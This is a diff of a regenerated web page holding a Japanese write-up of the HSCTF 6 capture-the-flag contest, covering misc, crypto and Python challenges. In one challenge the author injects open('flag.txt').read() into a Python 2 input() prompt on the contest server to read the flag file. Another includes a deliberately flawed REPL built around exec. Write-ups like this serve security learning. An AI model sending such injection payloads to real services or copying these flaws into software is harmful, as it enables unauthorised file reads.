@@ -23,7 +23,7 @@
 <meta name="google-site-verification" content="PqctLWZQttGzxXVupWuIt2HWuBI8cvN1z07ETpxA2dw" />
 
 
-<meta name="generator" content="Hugo 0.59.1 with theme even" />
+<meta name="generator" content="Hugo 0.68.3 with theme even" />
 
 
 <link rel="canonical" href="https://captureamerica.github.io/writeups/post/hsctf_2019/" />
@@ -46,16 +46,13 @@
 <meta property="article:modified_time" content="2020-01-19T18:00:00+09:00" />
 <meta itemprop="name" content="HSCTF 6 Writeup">
 <meta itemprop="description" content="(2020/01/19 - 復習しました) やり始めてから気づいたんですけど、HSってHigh Schoolerの略で、高校生用のCTFみたいですね。 Rulesを見たら">
-
-
 <meta itemprop="datePublished" content="2019-06-08T00:00:00&#43;08:00" />
 <meta itemprop="dateModified" content="2020-01-19T18:00:00&#43;09:00" />
-<meta itemprop="wordCount" content="9051">
+<meta itemprop="wordCount" content="9052">
 
 
 
-<meta itemprop="keywords" content="CTF,Reviewed," />
-<meta name="twitter:card" content="summary"/>
+<meta itemprop="keywords" content="CTF,Reviewed," /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="HSCTF 6 Writeup"/>
 <meta name="twitter:description" content="(2020/01/19 - 復習しました) やり始めてから気づいたんですけど、HSってHigh Schoolerの略で、高校生用のCTFみたいですね。 Rulesを見たら"/>
 
@@ -139,152 +136,168 @@
   <h2 class="post-toc-title">Contents</h2>
   <div class="post-toc-content">
     <nav id="TableOfContents">
-<ul>
-<li>
-<ul>
-<li><a href="#misc-locked-up">[Misc]: Locked Up</a>
-<ul>
-<li><a href="#challenge">Challenge</a></li>
-<li><a href="#solution">Solution</a></li>
-</ul></li>
-<li><a href="#misc-verbose">[Misc]: Verbose</a>
-<ul>
-<li><a href="#challenge-1">Challenge</a></li>
-<li><a href="#solution-1">Solution</a></li>
-</ul></li>
-<li><a href="#misc-admin-pass">[Misc]: Admin Pass</a>
-<ul>
-<li><a href="#challenge-2">Challenge</a></li>
-<li><a href="#solution-2">Solution</a></li>
-</ul></li>
-<li><a href="#misc-a-simple-conversation">[Misc]: A Simple Conversation</a>
-<ul>
-<li><a href="#challenge-3">Challenge</a></li>
-<li><a href="#solution-3">Solution</a></li>
-</ul></li>
-<li><a href="#misc-broken-gps">[Misc]: Broken GPS</a>
-<ul>
-<li><a href="#challenge-4">Challenge</a></li>
-<li><a href="#solution-4">Solution</a></li>
-</ul></li>
-<li><a href="#misc-broken-repl">[Misc]: Broken REPL</a>
-<ul>
-<li><a href="#challenge-5">Challenge</a></li>
-<li><a href="#unsolved">(Unsolved)</a></li>
-</ul></li>
-<li><a href="#misc-english-sucks">[Misc]: English Sucks</a>
-<ul>
-<li><a href="#challenge-6">Challenge</a></li>
-<li><a href="#unsolved-1">(Unsolved)</a></li>
-</ul></li>
-<li><a href="#crypto-reverse-search-algorithm">[Crypto]: Reverse Search Algorithm</a>
-<ul>
-<li><a href="#challenge-7">Challenge</a></li>
-<li><a href="#solution-5">Solution</a></li>
-</ul></li>
-<li><a href="#reversing-a-byte">[Reversing]: A Byte</a>
-<ul>
-<li><a href="#challenge-8">Challenge</a></li>
-<li><a href="#solution-6">Solution</a></li>
-</ul></li>
-<li><a href="#pwn-return-to-sender">[Pwn]: Return to Sender</a>
-<ul>
-<li><a href="#challenge-9">Challenge</a></li>
-<li><a href="#solution-7">Solution</a></li>
-</ul></li>
-<li><a href="#pwn-combo-chain-lite">[Pwn]: Combo Chain Lite</a>
-<ul>
-<li><a href="#challenge-10">Challenge</a></li>
-<li><a href="#solution-8">Solution</a></li>
-</ul></li>
-<li><a href="#forensics-chicken-crossing">[Forensics]: Chicken Crossing</a>
-<ul>
-<li><a href="#challenge-11">Challenge</a></li>
-<li><a href="#solution-9">Solution</a></li>
-</ul></li>
-<li><a href="#forensics-cool-image">[Forensics]: Cool Image</a>
-<ul>
-<li><a href="#challenge-12">Challenge</a></li>
-<li><a href="#solution-10">Solution</a></li>
-</ul></li>
-<li><a href="#forensics-cool-image-2">[Forensics]: Cool Image 2</a>
-<ul>
-<li><a href="#challenge-13">Challenge</a></li>
-<li><a href="#solution-11">Solution</a></li>
-</ul></li>
-<li><a href="#forensics-slap">[Forensics]: Slap</a>
-<ul>
-<li><a href="#challenge-14">Challenge</a></li>
-<li><a href="#solution-12">Solution</a></li>
-</ul></li>
-<li><a href="#forensics-fish">[Forensics]: Fish</a>
-<ul>
-<li><a href="#challenge-15">Challenge</a></li>
-<li><a href="#solution-13">Solution</a></li>
-</ul></li>
-<li><a href="#web-inspect-me">[Web]: Inspect Me</a>
-<ul>
-<li><a href="#challenge-16">Challenge</a></li>
-<li><a href="#solution-14">Solution</a></li>
-</ul></li>
-<li><a href="#web-agent-keith">[Web]: Agent Keith</a>
-<ul>
-<li><a href="#challenge-17">Challenge</a></li>
-<li><a href="#solution-15">Solution</a></li>
-</ul></li>
-<li><a href="#web-s-q-l">[Web]: S-Q-L</a>
-<ul>
-<li><a href="#challenge-18">Challenge</a></li>
-<li><a href="#solution-16">Solution</a></li>
-</ul></li>
-<li><a href="#web-the-quest">[Web]: The Quest</a>
-<ul>
-<li><a href="#challenge-19">Challenge</a></li>
-<li><a href="#solution-17">Solution</a></li>
-</ul></li>
-<li><a href="#web-keith-logger">[Web]: Keith Logger</a>
-<ul>
-<li><a href="#challenge-20">Challenge</a></li>
-<li><a href="#solution-18">Solution</a></li>
-</ul></li>
-<li><a href="#web-accessible-rich-internet-applications">[Web]: Accessible Rich Internet Applications</a>
-<ul>
-<li><a href="#challenge-21">Challenge</a></li>
-<li><a href="#solution-19">Solution</a></li>
-</ul></li>
-<li><a href="#misc-hidden-flag">[Misc]: Hidden Flag</a>
-<ul>
-<li><a href="#challenge-22">Challenge</a></li>
-<li><a href="#solution-20">Solution</a></li>
-</ul></li>
-<li><a href="#misc-logo-sucks-bad">[Misc]: Logo Sucks Bad</a>
-<ul>
-<li><a href="#challenge-23">Challenge</a></li>
-<li><a href="#solution-21">Solution</a></li>
-</ul></li>
-<li><a href="#misc-the-real-reversal">[Misc]: The Real Reversal</a>
-<ul>
-<li><a href="#challenge-24">Challenge</a></li>
-<li><a href="#solution-22">Solution</a></li>
-</ul></li>
-</ul></li>
-</ul>
+  <ul>
+    <li><a href="#misc-locked-up">[Misc]: Locked Up</a>
+      <ul>
+        <li><a href="#challenge">Challenge</a></li>
+        <li><a href="#solution">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc-verbose">[Misc]: Verbose</a>
+      <ul>
+        <li><a href="#challenge-1">Challenge</a></li>
+        <li><a href="#solution-1">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc-admin-pass">[Misc]: Admin Pass</a>
+      <ul>
+        <li><a href="#challenge-2">Challenge</a></li>
+        <li><a href="#solution-2">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc-a-simple-conversation">[Misc]: A Simple Conversation</a>
+      <ul>
+        <li><a href="#challenge-3">Challenge</a></li>
+        <li><a href="#solution-3">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc-broken-gps">[Misc]: Broken GPS</a>
+      <ul>
+        <li><a href="#challenge-4">Challenge</a></li>
+        <li><a href="#solution-4">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc-broken-repl">[Misc]: Broken REPL</a>
+      <ul>
+        <li><a href="#challenge-5">Challenge</a></li>
+        <li><a href="#unsolved">(Unsolved)</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc-english-sucks">[Misc]: English Sucks</a>
+      <ul>
+        <li><a href="#challenge-6">Challenge</a></li>
+        <li><a href="#unsolved-1">(Unsolved)</a></li>
+      </ul>
+    </li>
+    <li><a href="#crypto-reverse-search-algorithm">[Crypto]: Reverse Search Algorithm</a>
+      <ul>
+        <li><a href="#challenge-7">Challenge</a></li>
+        <li><a href="#solution-5">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#reversing-a-byte">[Reversing]: A Byte</a>
+      <ul>
+        <li><a href="#challenge-8">Challenge</a></li>
+        <li><a href="#solution-6">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#pwn-return-to-sender">[Pwn]: Return to Sender</a>
+      <ul>
+        <li><a href="#challenge-9">Challenge</a></li>
+        <li><a href="#solution-7">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#pwn-combo-chain-lite">[Pwn]: Combo Chain Lite</a>
+      <ul>
+        <li><a href="#challenge-10">Challenge</a></li>
+        <li><a href="#solution-8">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#forensics-chicken-crossing">[Forensics]: Chicken Crossing</a>
+      <ul>
+        <li><a href="#challenge-11">Challenge</a></li>
+        <li><a href="#solution-9">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#forensics-cool-image">[Forensics]: Cool Image</a>
+      <ul>
+        <li><a href="#challenge-12">Challenge</a></li>
+        <li><a href="#solution-10">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#forensics-cool-image-2">[Forensics]: Cool Image 2</a>
+      <ul>
+        <li><a href="#challenge-13">Challenge</a></li>
+        <li><a href="#solution-11">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#forensics-slap">[Forensics]: Slap</a>
+      <ul>
+        <li><a href="#challenge-14">Challenge</a></li>
+        <li><a href="#solution-12">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#forensics-fish">[Forensics]: Fish</a>
+      <ul>
+        <li><a href="#challenge-15">Challenge</a></li>
+        <li><a href="#solution-13">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#web-inspect-me">[Web]: Inspect Me</a>
+      <ul>
+        <li><a href="#challenge-16">Challenge</a></li>
+        <li><a href="#solution-14">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#web-agent-keith">[Web]: Agent Keith</a>
+      <ul>
+        <li><a href="#challenge-17">Challenge</a></li>
+        <li><a href="#solution-15">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#web-s-q-l">[Web]: S-Q-L</a>
+      <ul>
+        <li><a href="#challenge-18">Challenge</a></li>
+        <li><a href="#solution-16">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#web-the-quest">[Web]: The Quest</a>
+      <ul>
+        <li><a href="#challenge-19">Challenge</a></li>
+        <li><a href="#solution-17">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#web-keith-logger">[Web]: Keith Logger</a>
+      <ul>
+        <li><a href="#challenge-20">Challenge</a></li>
+        <li><a href="#solution-18">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#web-accessible-rich-internet-applications">[Web]: Accessible Rich Internet Applications</a>
+      <ul>
+        <li><a href="#challenge-21">Challenge</a></li>
+        <li><a href="#solution-19">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc-hidden-flag">[Misc]: Hidden Flag</a>
+      <ul>
+        <li><a href="#challenge-22">Challenge</a></li>
+        <li><a href="#solution-20">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc-logo-sucks-bad">[Misc]: Logo Sucks Bad</a>
+      <ul>
+        <li><a href="#challenge-23">Challenge</a></li>
+        <li><a href="#solution-21">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc-the-real-reversal">[Misc]: The Real Reversal</a>
+      <ul>
+        <li><a href="#challenge-24">Challenge</a></li>
+        <li><a href="#solution-22">Solution</a></li>
+      </ul>
+    </li>
+  </ul>
 </nav>
   </div>
 </div>
     <div class="post-content">
-      
-
-<div class='align-right'>
-  
+      <div class='align-right'>
 <a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fhsctf_2019%2F">
 <img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
 </a>
-
 </div>
-
 <p>(2020/01/19 - 復習しました)</p>
-
 <p>やり始めてから気づいたんですけど、HSってHigh Schoolerの略で、高校生用のCTFみたいですね。
 <br /><br />
 Rulesを見たら、「アメリカの高校生じゃないと賞はもらえないよ」とは書いてありましたが、「大人が参加しちゃダメ」とは書いてなかったのでやってみました。
@@ -294,101 +307,66 @@ Rulesを見たら、「アメリカの高校生じゃないと賞はもらえな
 チームのCaptainなので、Captain Capture Americaです（笑
 <br />
 <img src="https://captureamerica.github.io/writeups/img/captain.png" alt="captain.png"></p>
-
 <p>ちなみに、参加チームは全体で1000チームくらいでした。</p>
-
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="misc-locked-up">[Misc]: Locked Up</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge">Challenge</h3>
-
 <blockquote>
 <p>My friend gave me a zip file with the flag in it, but the zip file is encrypted. Can you help me open the zip file?</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>locked.zip</li>
 </ul>
-
 <h3 id="solution">Solution</h3>
-
 <pre>
 $ zipinfo locked.zip | grep hsctf
 -rwxrwxrwx  3.0 unx        0 BX stor 19-Jun-03 13:22 hsctf{w0w_z1ps_ar3nt_th@t_secUr3}
 </pre>
-
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="misc-verbose">[Misc]: Verbose</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-1">Challenge</h3>
-
 <blockquote>
-<p>My friend sent me this file, but I don't understand what I can do with these 6 different characters...</p>
+<p>My friend sent me this file, but I don&rsquo;t understand what I can do with these 6 different characters&hellip;</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>verbose.txt</li>
 </ul>
-
 <h3 id="solution-1">Solution</h3>
-
-<p><a href="http://codertab.com/JsUnFuck" target="_blank">http://codertab.com/JsUnFuck</a></p>
-
+<p><a href="http://codertab.com/JsUnFuck">http://codertab.com/JsUnFuck</a></p>
 <p>サイズが大きいので、結果が出るまで数分かかりました。<br />
-var flag = &quot;hsctf{esoteric_javascript_is_very_verbose}&quot;; window.location = &quot;<a href="https://hsctf.com&quot;" target="_blank">https://hsctf.com&quot;</a>;</p>
-
+var flag = &ldquo;hsctf{esoteric_javascript_is_very_verbose}&quot;; window.location = &ldquo;<a href="https://hsctf.com">https://hsctf.com</a>&rdquo;;</p>
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="misc-admin-pass">[Misc]: Admin Pass</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-2">Challenge</h3>
-
 <blockquote>
-<p>Hey guys, found a super cool website at <a href="http://misc.hsctf.com:8001!" target="_blank">http://misc.hsctf.com:8001!</a></p>
+<p>Hey guys, found a super cool website at <a href="http://misc.hsctf.com">http://misc.hsctf.com</a>:8001!</p>
 </blockquote>
-
 <h3 id="solution-2">Solution</h3>
-
 <p>gitlab.comへのリンクがあって、そこに飛んでファイルの過去の履歴とか見ているとフラグが見つかります。</p>
-
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="misc-a-simple-conversation">[Misc]: A Simple Conversation</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-3">Challenge</h3>
-
 <blockquote>
 <p>Someone on the internet wants to talk to you. Can you find out what they want?</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>talk.py</li>
 </ul>
-
 <p>以下、抜粋。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -419,38 +397,32 @@ var flag = &quot;hsctf{esoteric_javascript_is_very_verbose}&quot;; window.locati
 
 <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 
-<span class="k">print</span><span class="p">(</span><span class="s2">&#34;Well, it was nice meeting you, </span><span class="si">%s</span><span class="s2">-year-old.&#34;</span> <span class="o">%</span> <span class="n">age</span><span class="p">)</span></code></pre></td></tr></table>
+<span class="k">print</span><span class="p">(</span><span class="s2">&#34;Well, it was nice meeting you, </span><span class="si">%s</span><span class="s2">-year-old.&#34;</span> <span class="o">%</span> <span class="n">age</span><span class="p">)</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<h3 id="solution-3">Solution</h3>
-
-<p><code>open('flag.txt').read()</code>
+</div><h3 id="solution-3">Solution</h3>
+<p><code>open('flag.txt').read()</code></p>
 <pre>
 $ nc misc.hsctf.com 9001
 Hello!
 Hey, can you help me out real quick.
 I need to know your age.
 What's your age?
-&gt; open('flag.txt').read()
+> open('flag.txt').read()
 Wow!
-Sometimes I wish I was hsctf{plz_u5e_pyth0n_3}</p>
+Sometimes I wish I was hsctf{plz_u5e_pyth0n_3}
 
-<p>Well, it was nice meeting you, hsctf{plz_u5e_pyth0n_3}
+Well, it was nice meeting you, hsctf{plz_u5e_pyth0n_3}
 -year-old.
 Goodbye!
-</pre></p>
-
+</pre>
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="misc-broken-gps">[Misc]: Broken GPS</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-4">Challenge</h3>
-
 <blockquote>
-<p>Ella is following a broken GPS. The GPS tells her to move in the opposite direction than the one she should be travelling in to get to her destination, and she follows her GPS exactly. For instance, every time she is supposed to move west, the GPS tells her to move east and she does so. Eventually she ends up in a totally different place than her intended location. What is the shortest distance between these two points? Assume that she moves one unit every time a direction is specified. For instance, if the GPS tells her to move &quot;north,&quot; she moves one unit north. If the GPS tells her to move &quot;northwest,&quot; then she moves one unit north and one unit west.
+<p>Ella is following a broken GPS. The GPS tells her to move in the opposite direction than the one she should be travelling in to get to her destination, and she follows her GPS exactly. For instance, every time she is supposed to move west, the GPS tells her to move east and she does so. Eventually she ends up in a totally different place than her intended location. What is the shortest distance between these two points? Assume that she moves one unit every time a direction is specified. For instance, if the GPS tells her to move &ldquo;north,&rdquo; she moves one unit north. If the GPS tells her to move &ldquo;northwest,&rdquo; then she moves one unit north and one unit west.
 <br /><br />
 Input Format:<br />
 You will receive a text file with N directions provided to her by the GPS (the ones that she will be following) (1&lt;=N&lt;=1000). The first line in the file will be N, and each consequent line will contain a single direction: “north,” “south,” “east,” “west,” “northwest,” “northeast,” “southwest,” or “southeast.”
@@ -460,19 +432,15 @@ Round your answer to the nearest whole number and then divide by 26. Discard the
 <br /><br />
 Find the letter for each test case and string them together. The result is the flag. (For instance, a, b, c becomes “abc”). Remember to use the flag format and keep all letters lowercase!</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>input.zip</li>
 </ul>
-
 <h3 id="solution-4">Solution</h3>
-
 <p>問題文がとにかく長いけど、言われるがままにコーディングするだけの問題。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-c" data-lang="c"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -669,33 +637,27 @@ Find the letter for each test case and string them together. The result is the f
 	<span class="p">}</span>
 	<span class="n">printf</span><span class="p">(</span> <span class="s">&#34;}</span><span class="se">\n</span><span class="s">&#34;</span> <span class="p">);</span>
 	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>strstr()をやる順番に注意。最初、&quot;east&quot;のチェックをアタマに入れていたら、&quot;northeast&quot;と&quot;southeast&quot;も持っていかれて違う答えになっちゃってました。。
+</div><p>strstr()をやる順番に注意。最初、&ldquo;east&quot;のチェックをアタマに入れていたら、&ldquo;northeast&quot;と&quot;southeast&quot;も持っていかれて違う答えになっちゃってました。。
 <br /><br />
 Flag: <code>hsctf{garminesuckz}</code></p>
-
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="misc-broken-repl">[Misc]: Broken REPL</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-5">Challenge</h3>
-
 <blockquote>
 <p>My friend says that there is a bug in my REPL. Can you help me find it?</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
-<li><p>repl.py</p>
+<li>repl.py</li>
+</ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -719,65 +681,56 @@ Flag: <code>hsctf{garminesuckz}</code></p>
 </span><span class="lnt">22
 </span><span class="lnt">23
 </span><span class="lnt">24
+</span><span class="lnt">25
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python3</span>
 <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;flag.txt&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">flag</span><span class="p">:</span> <span class="c1"># open flag file</span>
-<span class="n">flag</span> <span class="o">=</span> <span class="n">flag</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="c1"># read contents of flag file</span>
+    <span class="n">flag</span> <span class="o">=</span> <span class="n">flag</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="c1"># read contents of flag file</span>
 <span class="k">try</span><span class="p">:</span> <span class="c1"># make sure we don&#39;t run out of memory</span>
-<span class="k">while</span> <span class="mi">1</span><span class="p">:</span> <span class="c1"># do this forever</span>
-    <span class="k">try</span><span class="p">:</span> <span class="c1"># try to read a line of input</span>
-        <span class="n">line</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;&gt;&gt;&gt; &#34;</span><span class="p">)</span> <span class="c1"># prompt is python&#39;s standard prompt</span>
-    <span class="k">except</span> <span class="ne">EOFError</span><span class="p">:</span> <span class="c1"># user is done typing input</span>
-        <span class="k">print</span><span class="p">()</span> <span class="c1"># ensure there is a line-break</span>
-        <span class="k">break</span> <span class="c1"># exit from the loop</span>
-    <span class="k">else</span><span class="p">:</span> <span class="c1"># successfully read input</span>
-        <span class="k">try</span><span class="p">:</span> <span class="c1"># try to compile the input</span>
-            <span class="n">code</span> <span class="o">=</span> <span class="nb">compile</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s2">&#34;&lt;input&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;exec&#34;</span><span class="p">)</span> <span class="c1"># compile the line of input</span>
-        <span class="k">except</span> <span class="p">(</span><span class="ne">OverflowError</span><span class="p">,</span> <span class="ne">SyntaxError</span><span class="p">,</span> <span class="ne">ValueError</span><span class="p">,</span> <span class="ne">TypeError</span><span class="p">,</span> <span class="n">RecursionError</span><span class="p">)</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span> <span class="c1"># user input was bad</span>
-            <span class="k">print</span><span class="p">(</span><span class="s2">&#34;there was an error in your code:&#34;</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span> <span class="c1"># notify the user of the error</span>
-        <span class="k">if</span> <span class="bp">False</span><span class="p">:</span> <span class="k">exec</span><span class="p">(</span><span class="n">code</span><span class="p">)</span> <span class="c1"># run the code</span>
-        <span class="c1"># TODO: find replacement for exec</span>
-        <span class="c1"># TODO: exec is unsafe</span>
+    <span class="k">while</span> <span class="mi">1</span><span class="p">:</span> <span class="c1"># do this forever</span>
+        <span class="k">try</span><span class="p">:</span> <span class="c1"># try to read a line of input</span>
+            <span class="n">line</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;&gt;&gt;&gt; &#34;</span><span class="p">)</span> <span class="c1"># prompt is python&#39;s standard prompt</span>
+        <span class="k">except</span> <span class="ne">EOFError</span><span class="p">:</span> <span class="c1"># user is done typing input</span>
+            <span class="k">print</span><span class="p">()</span> <span class="c1"># ensure there is a line-break</span>
+            <span class="k">break</span> <span class="c1"># exit from the loop</span>
+        <span class="k">else</span><span class="p">:</span> <span class="c1"># successfully read input</span>
+            <span class="k">try</span><span class="p">:</span> <span class="c1"># try to compile the input</span>
+                <span class="n">code</span> <span class="o">=</span> <span class="nb">compile</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s2">&#34;&lt;input&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;exec&#34;</span><span class="p">)</span> <span class="c1"># compile the line of input</span>
+            <span class="k">except</span> <span class="p">(</span><span class="ne">OverflowError</span><span class="p">,</span> <span class="ne">SyntaxError</span><span class="p">,</span> <span class="ne">ValueError</span><span class="p">,</span> <span class="ne">TypeError</span><span class="p">,</span> <span class="n">RecursionError</span><span class="p">)</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span> <span class="c1"># user input was bad</span>
+                <span class="k">print</span><span class="p">(</span><span class="s2">&#34;there was an error in your code:&#34;</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span> <span class="c1"># notify the user of the error</span>
+            <span class="k">if</span> <span class="bp">False</span><span class="p">:</span> <span class="k">exec</span><span class="p">(</span><span class="n">code</span><span class="p">)</span> <span class="c1"># run the code</span>
+            <span class="c1"># TODO: find replacement for exec</span>
+            <span class="c1"># TODO: exec is unsafe</span>
 <span class="k">except</span> <span class="ne">MemoryError</span><span class="p">:</span> <span class="c1"># we ran out of memory</span>
-<span class="c1"># uh oh</span>
-<span class="c1"># lets remove the flag to clear up some memory</span>
-<span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span> <span class="c1"># log the flag so it is not lost</span>
-<span class="k">del</span> <span class="n">flag</span> <span class="c1"># delete the flag</span>
-<span class="c1"># hopefully we have enough memory now</span></code></pre></td></tr></table>
+    <span class="c1"># uh oh</span>
+    <span class="c1"># lets remove the flag to clear up some memory</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span> <span class="c1"># log the flag so it is not lost</span>
+    <span class="k">del</span> <span class="n">flag</span> <span class="c1"># delete the flag</span>
+    <span class="c1"># hopefully we have enough memory now</span>
+
+</code></pre></td></tr></table>
 </div>
-</div></li>
-</ul>
-
-<h3 id="unsolved">(Unsolved)</h3>
-
+</div><h3 id="unsolved">(Unsolved)</h3>
 <p>MemoryError例外を起こせばいいようだけど、できませんでした。raise使ったり、ウェブでMemoryError例外の事象のサンプルとか見つけてやったけれど、意図的に発生させようとするとなかなか難しいもんですね。</p>
-
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="misc-english-sucks">[Misc]: English Sucks</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-6">Challenge</h3>
-
 <blockquote>
 <p>English is such a confusing language. Can you help me understand it?
 <br /><br />
 Hint: Watch out for the order of the output.</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>mt.cpp</li>
 </ul>
-
 <p>以下、抜粋。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -893,31 +846,24 @@ Hint: Watch out for the order of the output.</p>
     <span class="p">}</span>
 </code></pre></td></tr></table>
 </div>
-</div>
-<h3 id="unsolved-1">(Unsolved)</h3>
-
+</div><h3 id="unsolved-1">(Unsolved)</h3>
 <p>なんとなく方向性はわかった気がしたんですが、解けませんでした。。
 <br /><br />
 mt19937 疑似乱数は連続した624個の結果があると、その次に出てくる乱数が予測できます。
 <br /><br />
 以下にツールがあります。<br />
-<a href="https://github.com/eboda/mersenne-twister-recover" target="_blank">https://github.com/eboda/mersenne-twister-recover</a>
+<a href="https://github.com/eboda/mersenne-twister-recover">https://github.com/eboda/mersenne-twister-recover</a>
 <br /><br />
 与えられたC++のコード（上記）で、216回ループしている中で3回ずつrandom()が呼ばれるので、合計648回（&gt; 624）。
 <br /><br />
 ビットシフトしているやつを逆にシフトしなおせばv1, v2, v3は求められると思いきや、一番最初と最後でORされちゃっているビットがあって、値が確定できません。
 <br /><br />
 問題が間違っているかと思って問い合わせをしてみたんですが、返事もないし、実際解いている人が何人かいたので、なんかしら解き方があるようです。。</p>
-
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="crypto-reverse-search-algorithm">[Crypto]: Reverse Search Algorithm</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-7">Challenge</h3>
-
 <blockquote>
 <p>WWPHSN students, gotta get these points to boost your grade.
 <br /><br />
@@ -927,23 +873,18 @@ e = 65537
 <br />
 c = 328055279212128616898203809983039708787490384650725890748576927208883055381430000756624369636820903704775835777</p>
 </blockquote>
-
 <h3 id="solution-5">Solution</h3>
-
 <p>SECCON Beginners CTF 2018 で出た「RSA is Power」とほぼ同じ問題のようです。</p>
-
 <p>以下のWriteupを参考にさせてもらいました。
 <br />
-<a href="https://graneed.hatenablog.com/entry/2018/05/27/183004" target="_blank">https://graneed.hatenablog.com/entry/2018/05/27/183004</a></p>
-
+<a href="https://graneed.hatenablog.com/entry/2018/05/27/183004">https://graneed.hatenablog.com/entry/2018/05/27/183004</a></p>
 <p>nを素因数分解してpとqを求め、
 <br />
-<a href="http://factordb.com/index.php?query=561985565696052620466091856149686893774419565625295691069663316673425409620917583731032457879432617979438142137" target="_blank">http://factordb.com/index.php?query=561985565696052620466091856149686893774419565625295691069663316673425409620917583731032457879432617979438142137</a></p>
-
+<a href="http://factordb.com/index.php?query=561985565696052620466091856149686893774419565625295691069663316673425409620917583731032457879432617979438142137">http://factordb.com/index.php?query=561985565696052620466091856149686893774419565625295691069663316673425409620917583731032457879432617979438142137</a></p>
 <p>pythonでゴニョゴニョっとやります。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
